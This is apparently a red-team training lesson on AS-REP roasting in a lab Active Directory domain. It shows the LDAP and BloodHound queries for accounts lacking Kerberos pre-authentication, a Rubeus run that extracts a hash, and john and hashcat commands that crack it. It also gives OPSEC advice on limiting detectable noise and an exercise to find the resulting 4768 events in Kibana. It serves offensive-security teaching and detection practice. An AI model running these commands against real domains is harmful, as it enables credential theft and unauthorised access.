If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password. This configuration is also enabled on the User Object and is often seen on accounts that are used on Linux systems.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/kerberos/preauth.png)

  

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
    [+] cn                : Oracle Service
    [+] distinguishedname : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
    [+] samaccountname    : svc_oracle
```

  

In BloodHound:

```
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap

[*] Action: AS-REP roasting

[*] Target User            : svc_oracle
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for AS-REP roastable users
[*] SamAccountName         : svc_oracle
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\svc_oracle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

$krb5asrep$svc_oracle@dev.cyberbotic.io:F3B1A1 [...snip...] D6D049
```

  

>  **OPSEC Alert**  
>  As with Kerberoasting, don't run `asreproast` by itself as this will roast every account in the domain with pre-authentication not set. 
>  AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.  There is no /opsec option to AS-REP Roast with a high encryption type and even if there was, it would make the hash much harder to crack.

Use `--format=krb5asrep --wordlist=wordlist svc_oracle` for **john** or `-a 0 -m 18200 svc_oracle wordlist` for **hashcat**.

```
root@kali:~# john --format=krb5asrep --wordlist=wordlist svc_oracle
Passw0rd!        ($krb5asrep$svc_oracle@dev.cyberbotic.io)
```

  

>  **EXERCISE**  
>  AS-REP Roast accounts in the domain and find the corresponding 4768's in Kibana.

